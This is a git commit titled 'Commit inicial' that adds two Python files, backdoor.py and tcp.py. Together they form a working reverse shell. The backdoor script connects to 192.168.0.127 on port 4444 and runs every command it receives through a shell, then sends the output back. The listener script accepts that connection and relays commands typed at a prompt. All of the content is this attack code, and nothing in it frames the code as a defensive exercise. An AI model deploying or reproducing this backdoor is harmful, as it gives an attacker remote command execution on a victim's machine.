232c08b7c7341769345eb39d83473a6814fa7a5b
EssEnemiGz <essenemiggz@gmail.com>
2021-11-12 14:32:42 -0400

    Commit inicial

---
+++ backdoor.py
@@ -0,0 +1,20 @@
+import socket
+import subprocess
+
+class door:
+    def __init__(self, ip, puerto):
+        self.access = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.access.connect( (ip, puerto) )           
+
+    def command_func(self, command):
+        return subprocess.check_output(command, shell=True)
+        
+    def run_commands(self):
+        while True:
+            command = self.access.recv(1024)
+            command_result = self.command_func(command)
+            self.access.send(command_result)
+        access.close()
+
+door_real = door('192.168.0.127', 4444)
+door_real.run_commands()
---
+++ tcp.py
@@ -0,0 +1,25 @@
+import socket 
+import json
+
+class TCP:
+    def __init__(self, ip, puerto):
+        connection1 = access = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connection1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+        connection1.bind( (ip, puerto) )
+        connection1.listen(0)
+        print('Connection...')
+        self.connection, addr = connection1.accept()
+        print('Connection... Enable to' + str(addr))
+    def commands(self, command):
+        self.connection.send(command.encode())
+        return self.connection.recv(1024).decode()
+
+    def start(self):
+        while True:
+            command = input(">")
+            result = self.commands(command)
+            print(result)
+
+run = TCP("192.168.0.127", 4444)
+run.start()
